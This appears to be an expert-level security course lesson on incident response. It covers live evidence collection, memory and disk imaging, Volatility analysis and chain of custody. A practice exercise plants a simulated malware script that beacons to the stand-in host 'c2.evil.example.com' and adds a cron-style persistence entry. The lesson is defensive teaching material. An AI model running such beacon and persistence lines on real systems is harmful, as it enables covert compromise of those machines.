# Lesson 27: Incident Response

> **Security Advanced · Lesson 27** | Difficulty: ★★★★★ Expert | Time: ~150 min

---

## Learning Objectives

By the end of this lesson you will be able to:

- Navigate the full Incident Response lifecycle using industry-standard frameworks
- Create forensically sound disk images using `dd` and `dcfldd`
- Perform memory forensics using the Volatility framework
- Collect volatile evidence in the correct order of volatility
- Maintain chain of custody and document findings properly
- Recognise post-compromise indicators and contain active intrusions

---

## Prerequisites

- Lesson 26 (Malware Analysis) or equivalent
- Linux administration skills (filesystems, processes, networking)
- Familiarity with disk and partition concepts
- Root access on a test system

---

## Key Concepts

### 1. The Incident Response Lifecycle

The NIST SP 800-61r2 framework defines four phases:

```
┌─────────────────────────────────────────────────┐
│              IR LIFECYCLE                        │
│                                                  │
│  ① Preparation                                  │
│     • IR policy, playbooks, contact lists       │
│     • Toolkits, documentation, training         │
│     • Monitoring infrastructure (SIEM/EDR)      │
│                  │                               │
│                  ▼                               │
│  ② Detection & Analysis                         │
│     • Alert triage, scope assessment            │
│     • IOC identification                        │
│     • Incident classification                   │
│                  │                               │
│                  ▼                               │
│  ③ Containment, Eradication & Recovery         │
│     • Short-term containment (isolate host)     │
│     • Long-term containment (patch)             │
│     • Eradication (remove malware)              │
│     • Recovery (restore from clean backup)      │
│                  │                               │
│                  ▼                               │
│  ④ Post-Incident Activity                       │
│     • Lessons learned meeting                   │
│     • Final report                              │
│     • Process improvements                      │
└─────────────────────────────────────────────────┘
```

**Incident classification**:

| Severity | Description | Response SLA |
|----------|-------------|--------------|
| P1 Critical | Active breach, data exfiltration, ransomware | < 1 hour |
| P2 High | Confirmed malware, compromised credentials | < 4 hours |
| P3 Medium | Suspicious activity, policy violation | < 24 hours |
| P4 Low | Security event requiring investigation | < 72 hours |

### 2. Order of Volatility

Collect evidence from most volatile to least volatile:

```
1. CPU registers, cache                    ← Lost immediately when power off
2. Routing tables, ARP cache, process list ← Seconds to minutes
3. Memory (RAM)                            ← Lost when power off
4. Temp files and swap                     ← May be overwritten soon
5. Hard drive data                         ← Relatively stable
6. Remote logging / SIEM                   ← Usually stable
7. Physical configuration                  ← Most stable
```

### 3. Live Response – Volatile Data Collection

```bash
#!/bin/bash
# live_response.sh – collect volatile evidence before shutdown
# Run as root; output to /media/usb/evidence/

CASE="IR-2025-001"
HOST=$(hostname)
DATE=$(date +%Y%m%d_%H%M%S)
OUTPUT="/media/usb/evidence/${CASE}_${HOST}_${DATE}"
mkdir -p "$OUTPUT"

log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$OUTPUT/collection.log"; }

log "Starting live response collection"
log "Case: $CASE | Host: $HOST"

# System info
log "Collecting system information"
date > "$OUTPUT/timestamp.txt"
uname -a > "$OUTPUT/uname.txt"
uptime > "$OUTPUT/uptime.txt"
hostname > "$OUTPUT/hostname.txt"

# Running processes
log "Collecting process information"
ps auxf > "$OUTPUT/ps_auxf.txt"
ps -eo pid,ppid,user,lstart,cmd --sort=lstart > "$OUTPUT/ps_sorted.txt"
ls -la /proc/*/exe 2>/dev/null > "$OUTPUT/proc_exe.txt"

# Network connections
log "Collecting network state"
ss -tulnape > "$OUTPUT/ss_connections.txt"
netstat -tulnap 2>/dev/null > "$OUTPUT/netstat.txt"
ip route show > "$OUTPUT/routes.txt"
ip neigh show > "$OUTPUT/arp.txt"
cat /proc/net/tcp > "$OUTPUT/proc_net_tcp.txt"
cat /proc/net/udp > "$OUTPUT/proc_net_udp.txt"

# Logged-in users
log "Collecting user sessions"
who -a > "$OUTPUT/who.txt"
w > "$OUTPUT/w.txt"
last -20 > "$OUTPUT/last.txt"
lastlog > "$OUTPUT/lastlog.txt"

# Scheduled tasks
log "Collecting scheduled tasks"
crontab -l 2>/dev/null > "$OUTPUT/crontab_root.txt"
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null > "$OUTPUT/cron_dirs.txt"
systemctl list-timers --all > "$OUTPUT/systemd_timers.txt"

# Loaded kernel modules
log "Collecting kernel modules"
lsmod > "$OUTPUT/lsmod.txt"

# Open files
log "Collecting open files"
lsof -n > "$OUTPUT/lsof.txt" 2>/dev/null

# Loaded libraries (for LD_PRELOAD backdoors)
log "Checking LD_PRELOAD"
cat /etc/ld.so.preload 2>/dev/null > "$OUTPUT/ld_preload.txt"
env | grep LD_ > "$OUTPUT/ld_env.txt" 2>/dev/null

# Hash the collection manifest
find "$OUTPUT" -type f -exec sha256sum {} \; > "$OUTPUT/manifest.sha256"
log "Collection complete. Evidence at: $OUTPUT"
```

### 4. Memory Acquisition

```bash
# Method 1: /proc/kcore (limited – kernel memory only)
sudo dd if=/proc/kcore of=/media/usb/kcore.raw bs=4M status=progress

# Method 2: LiME (Linux Memory Extractor) – recommended
# Install LiME module (must be compiled for the exact kernel version)
sudo apt install -y linux-headers-$(uname -r) build-essential git
git clone https://github.com/504ensicsLabs/LiME /tmp/LiME
cd /tmp/LiME/src && make
# Load module and dump memory to file
sudo insmod lime-$(uname -r).ko "path=/media/usb/memory.lime format=lime"
# Or dump to network (avoids writing to the suspect disk)
sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"
# On analysis machine: nc <target_ip> 4444 > memory.lime

# Method 3: /dev/mem (limited by IOMEM restrictions in modern kernels)
sudo dd if=/dev/mem of=/media/usb/mem.raw bs=1M count=1024

# Verify the memory dump
sha256sum /media/usb/memory.lime > /media/usb/memory.lime.sha256
```

### 5. Forensic Disk Imaging

The golden rule: **work only on copies, never on the original evidence**.

```bash
# Method 1: dd – standard Unix disk duplicator
# ALWAYS write-protect the source first!
sudo hdparm -r1 /dev/sdb     # Set read-only (if supported)

# Create a bit-for-bit image
sudo dd if=/dev/sdb of=/media/usb/disk_image.raw \
  bs=4M conv=noerror,sync status=progress

# Verify integrity with hashes (run BEFORE and AFTER imaging)
sudo md5sum /dev/sdb > /media/usb/source_md5.txt
md5sum /media/usb/disk_image.raw >> /media/usb/source_md5.txt

# Method 2: dcfldd – enhanced dd for forensics
sudo apt install -y dcfldd
sudo dcfldd if=/dev/sdb of=/media/usb/disk_image.raw \
  bs=4M hash=sha256 hashlog=/media/usb/hash.log \
  hashwindow=10G errlog=/media/usb/error.log \
  status=on statusinterval=256 conv=noerror,sync

# Method 3: dc3dd – US DoD tool with built-in hashing and splitting
sudo apt install -y dc3dd
sudo dc3dd if=/dev/sdb of=/media/usb/disk_image.raw \
  hash=sha256 hof=/media/usb/hash.txt log=/media/usb/log.txt

# Method 4: Compressed image with split (for large drives)
sudo dcfldd if=/dev/sdb bs=4M | gzip -c | split -b 4G \
  - /media/usb/disk_image.raw.gz.part

# Method 5: Network acquisition (when no removable media)
# On receiving machine:
sudo nc -l 9999 | sudo dd of=/evidence/disk_image.raw bs=4M

# On source machine:
sudo dd if=/dev/sdb bs=4M | nc <analyst_ip> 9999

# Mount the image read-only for analysis
sudo mount -o ro,loop,noatime /media/usb/disk_image.raw /mnt/evidence
```

### 6. Filesystem Forensics

```bash
# List deleted files (inodes still in use)
sudo apt install -y sleuthkit autopsy

# List filesystem timeline
fls -r -m / /media/usb/disk_image.raw > /tmp/bodyfile.txt
mactime -b /tmp/bodyfile.txt -d > /tmp/timeline.csv

# Recover deleted files
sudo foremost -i /media/usb/disk_image.raw -o /media/usb/recovered/
sudo photorec /media/usb/disk_image.raw  # Interactive

# Check for slack space and hidden data
blkls /media/usb/disk_image.raw > /tmp/unallocated.raw
strings /tmp/unallocated.raw | grep -iE "password|secret|key|token" | head -20

# Examine specific file metadata
istat /media/usb/disk_image.raw <inode_number>

# Find all files modified in the last 24 hours (on mounted image)
find /mnt/evidence -newer /mnt/evidence/etc/passwd -not -path "/proc/*" -ls 2>/dev/null

# Check Extended Attributes (used by SELinux, capabilities, hidden data)
getfattr -d -m - /mnt/evidence/some/file 2>/dev/null
```

### 7. Memory Forensics with Volatility

Volatility is the industry-standard memory forensics framework.

```bash
# Install Volatility 3 (Python)
pip3 install volatility3
# or
git clone https://github.com/volatilityfoundation/volatility3 /opt/volatility3
pip3 install -r /opt/volatility3/requirements.txt

# Determine the OS profile/symbol table
vol -f memory.lime banners.Banners
vol -f memory.lime linux.uname.Uname

# List processes (equivalent to ps)
vol -f memory.lime linux.pslist.PsList
vol -f memory.lime linux.pstree.PsTree

# Find hidden/unlinked processes (rootkit detection)
vol -f memory.lime linux.psscan.PsScan
# Compare PsList output with PsScan – differences = hidden processes

# List network connections
vol -f memory.lime linux.netstat.Netstat

# Extract process memory map
vol -f memory.lime linux.proc.Maps --pid 1234

# Dump a process's memory to disk
vol -f memory.lime linux.memmap.Memmap --pid 1234 --dump

# Find bash history in memory (even if .bash_history was cleared)
vol -f memory.lime linux.bash.Bash

# List loaded kernel modules
vol -f memory.lime linux.lsmod.Lsmod

# Find hidden kernel modules (rootkit detection)
vol -f memory.lime linux.check_modules.Check_modules

# Scan for YARA patterns in memory
vol -f memory.lime yarascan.YaraScan --yara-file malware_rules.yar

# Extract files from memory (cached files)
vol -f memory.lime linux.find_file.FindFile
vol -f memory.lime linux.dump_map.DumpMap --pid 1234 --dump

# Check for LD_PRELOAD injections
vol -f memory.lime linux.library_list.LibraryList
```

### 8. Chain of Custody

Chain of custody ensures evidence is admissible in court and maintains integrity.

```bash
# Chain of custody documentation template
cat > /media/usb/CHAIN_OF_CUSTODY.txt << 'EOF'
============================================
CHAIN OF CUSTODY RECORD
============================================
Case Number    : IR-2025-001
Incident Type  : Suspected Unauthorised Access
Date/Time      : 2025-01-15 14:30:00 UTC

EVIDENCE ITEM 1:
  Description  : Forensic disk image
  Source       : /dev/sdb (SN: XYZ123456)
  Hostname     : webserver01.example.com
  Image File   : disk_image.raw
  SHA-256      : <hash>
  MD5          : <hash>
  Acquired by  : Jane Smith (jsmith@example.com)
  Tool Used    : dcfldd v1.3.4
  Acquisition  : 2025-01-15 14:45:00 UTC
  Notes        : Source drive write-protected before acquisition

EVIDENCE ITEM 2:
  Description  : Memory dump
  Source       : RAM (8GB) of webserver01
  Image File   : memory.lime
  SHA-256      : <hash>
  Acquired by  : Jane Smith
  Tool Used    : LiME v1.9
  Acquisition  : 2025-01-15 14:32:00 UTC

TRANSFER LOG:
  2025-01-15 15:00 – Evidence packaged and sealed (seal #SL-001)
  2025-01-15 15:30 – Transferred to analysis lab (received by: Bob Jones)
  2025-01-16 09:00 – Analysis begun by: Alice Chen
============================================
EOF
```

---

## Practical Exercises

### Exercise 1 – Simulate and Respond to an Incident

```bash
# Simulate an attacker leaving traces
mkdir -p /tmp/sim_incident

# Simulate dropped malware
echo '#!/bin/bash
curl -s http://c2.evil.example.com/beacon &' > /tmp/sim_incident/updater.sh
chmod +x /tmp/sim_incident/updater.sh

# Simulate a cron backdoor (non-destructive test)
echo "# Simulated persistence entry:" >> /tmp/sim_cron_test.txt
echo "*/5 * * * * /tmp/sim_incident/updater.sh" >> /tmp/sim_cron_test.txt

# NOW respond:
echo "=== Active Connections ==="
ss -tulnap | grep -v "127.0.0\|::1"

echo "=== Recently Modified Files ==="
find /tmp /var/tmp -newer /etc/passwd -ls 2>/dev/null

echo "=== Suspicious Cron Entries ==="
grep -v "^#\|^$" /tmp/sim_cron_test.txt

# Clean up simulation
rm -rf /tmp/sim_incident /tmp/sim_cron_test.txt
```

### Exercise 2 – Forensic Disk Image of a File

```bash
# Create a small test "disk" (file instead of real device)
dd if=/dev/urandom of=/tmp/test_disk.img bs=1M count=10
mkfs.ext4 /tmp/test_disk.img -L "TEST_DISK" 2>/dev/null

# Mount and add test data
sudo mkdir -p /mnt/test_disk
sudo mount -o loop /tmp/test_disk.img /mnt/test_disk
echo "Evidence file" | sudo tee /mnt/test_disk/important.txt
sudo umount /mnt/test_disk

# Forensic image of the image (chain verification)
sha256sum /tmp/test_disk.img > /tmp/source_hash.txt
dd if=/tmp/test_disk.img of=/tmp/forensic_copy.img bs=4M conv=noerror,sync status=progress
sha256sum /tmp/forensic_copy.img > /tmp/copy_hash.txt

echo "=== Hash Comparison ==="
echo "Source: $(cat /tmp/source_hash.txt)"
echo "Copy:   $(cat /tmp/copy_hash.txt)"
diff <(awk '{print $1}' /tmp/source_hash.txt) <(awk '{print $1}' /tmp/copy_hash.txt) \
  && echo "HASHES MATCH – forensically sound" || echo "HASH MISMATCH – investigate!"

# Mount copy read-only and analyse
sudo mount -o ro,loop /tmp/forensic_copy.img /mnt/test_disk
ls -la /mnt/test_disk
sudo umount /mnt/test_disk

# Clean up
rm -f /tmp/test_disk.img /tmp/forensic_copy.img /tmp/source_hash.txt /tmp/copy_hash.txt
```

### Exercise 3 – Log Timeline Analysis

```bash
# Generate a simulated auth log with suspicious events
cat > /tmp/sim_auth.log << 'EOF'
Jan 15 03:14:59 srv sshd[1234]: Failed password for root from 185.220.101.5 port 41234 ssh2
Jan 15 03:15:01 srv sshd[1234]: Failed password for root from 185.220.101.5 port 41236 ssh2
Jan 15 03:15:03 srv sshd[1234]: Failed password for root from 185.220.101.5 port 41238 ssh2
Jan 15 03:15:05 srv sshd[1235]: Accepted password for admin from 185.220.101.5 port 41240 ssh2
Jan 15 03:15:07 srv sudo[1236]: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
Jan 15 03:16:00 srv cron[1237]: (root) CMD (/tmp/.update)
Jan 15 03:20:00 srv sshd[1238]: Accepted publickey for root from 10.99.0.1 port 54321 ssh2
EOF

echo "=== SSH Brute Force Analysis ==="
grep "Failed password" /tmp/sim_auth.log | awk '{print $11}' \
  | sort | uniq -c | sort -rn

echo "=== Successful Logins After Failures ==="
grep "Accepted" /tmp/sim_auth.log

echo "=== Privilege Escalation ==="
grep "sudo\|su\[" /tmp/sim_auth.log

echo "=== Suspicious Cron Jobs ==="
grep "cron" /tmp/sim_auth.log | grep -v "CRON\|session"

rm /tmp/sim_auth.log
```

---

## Common Pitfalls

| Pitfall | Consequence | Fix |
|---------|-------------|-----|
| Powering off before memory capture | Lose volatile evidence | ALWAYS capture RAM before shutdown |
| Writing tools to the suspect disk | Modifies evidence, inadmissible | Boot from USB / network-mount tools |
| No hash verification of images | Can't prove integrity in court | Hash source AND copy; document everything |
| Single point of evidence collection | Gaps in timeline | Collect from multiple sources: auth logs, DNS, SIEM |
| Sharing unredacted IOCs publicly | Alerts attacker, legal exposure | Share defanged IOCs; consult legal before publishing |
| Containment before evidence collection | Evidence lost when system isolated | Collect volatile data first, then contain |
| Not documenting every action taken | Chain of custody broken | Write down timestamps and commands in real time |

---

## Summary

- The **NIST IR lifecycle**: Prepare → Detect → Contain/Eradicate/Recover → Post-incident
- Collect evidence in **order of volatility**: RAM → network state → disk
- **dcfldd / dc3dd** create verified forensic disk images with built-in hashing
- **Volatility** enables deep memory analysis: processes, network connections, malware artefacts
- **Chain of custody** is non-negotiable — document every action, hash every piece of evidence
- Always work on forensic copies, never the original media
- The goal is to answer: Who? What? When? How? — and prevent recurrence

---

## Further Reading

- [NIST SP 800-61r2 – Computer Security Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [Volatility Documentation](https://volatility3.readthedocs.io/)
- [SANS Digital Forensics & Incident Response Posters](https://www.sans.org/posters/?focus-area=digital-forensics)
- [The Sleuth Kit (TSK)](https://www.sleuthkit.org/)
- [LiME – Linux Memory Extractor](https://github.com/504ensicsLabs/LiME)
- *The Art of Memory Forensics* by Ligh, Case, Levy, Walters (Wiley)
- *Incident Response & Computer Forensics* by Luttgens, Pepe, Mandia (McGraw-Hill)
